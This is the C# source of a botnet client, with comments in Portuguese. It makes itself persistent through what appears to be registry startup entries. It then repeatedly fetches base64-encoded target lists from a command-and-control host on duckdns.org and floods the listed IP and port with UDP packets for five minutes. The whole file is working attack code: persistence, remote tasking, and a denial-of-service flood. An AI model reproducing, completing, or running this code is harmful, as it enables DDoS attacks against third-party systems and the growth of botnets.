using botNetClient.utils;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace botNetClient
{
    class Program
    {
        static Thread tread1;
        static Thread tread2;


        static void Main(string[] args)
        {
            Thread.Sleep(15000);
            StartUp.checkFile();
            StartUp.Regedit();

            // [thread] Verificar alvos e adicionar em listas
            tread1 = new Thread(new ThreadStart(updateList));
            tread1.Start();
            Process.GetCurrentProcess().WaitForExit();
        }


        static void checkAtaque()
        {
            StartUp.Regedit(); // StartUp persistente

            if (ReadXML._ranks.Count < 1) // Sem ataque na lista, então para
            {
                Console.WriteLine("Nenhum Alvo detectado! ");
                return;
            }

            /*for (int i = 0; i < ReadXML._ranks.Count; i++)
            {
                Console.WriteLine("Alvo detectado! _rank["+i+"] " + ReadXML._ranks[i]._ip);
            }*/

            tread2 = new Thread(new ThreadStart(floodUdp));
            tread2.Start();

            Console.WriteLine("Pronto!!");


        }

        static async void floodUdp()
        {
            try
            {
                int porta = ReadXML._ranks[0]._port;
                string ip = ReadXML._ranks[0]._ip;

                Console.WriteLine("Atacando=> udp:\\\\" + ReadXML._ranks[0]._ip+":"+ReadXML._ranks[0]._port);

                DateTime startDate = DateTime.Now;
                using (UdpClient udp = new UdpClient())
                {
                    SendPacket s = new SendPacket();
                    s.writeS("0", ReadXML._ranks[0]._size);


                    while (DateTime.Now.Subtract(startDate).Minutes < 5)
                    {
                        udp.Send(s.mstream.ToArray(), s.mstream.ToArray().Length, ip, porta);
                    }
                }
            }
            catch(Exception ex) 
            {
                Console.WriteLine(ex);
            }
            Console.WriteLine("C l o s e");
            tread2.Abort();
        }

        static async void updateList()
        {
            tread2 = Thread.CurrentThread;
            while (true)
            {
                await Task.Delay(50000);
                try
                {
                    if (tread2.IsAlive)
                    {
                        Console.WriteLine("Já existe um ataque em andamento!");
                        continue;
                    }

                    var webClient = new WebClient { Encoding = Encoding.UTF8 };
                    string xmlCrypt = webClient.DownloadString("http://udp3server.duckdns.org:8082");

                    xmlCrypt = Encoding.UTF8.GetString(Convert.FromBase64String(xmlCrypt));

                    ReadXML.loadXML(xmlCrypt);
                    checkAtaque();
                }
                catch (Exception ex){
                    Console.WriteLine(ex);
                }
            }
        }
    }
}
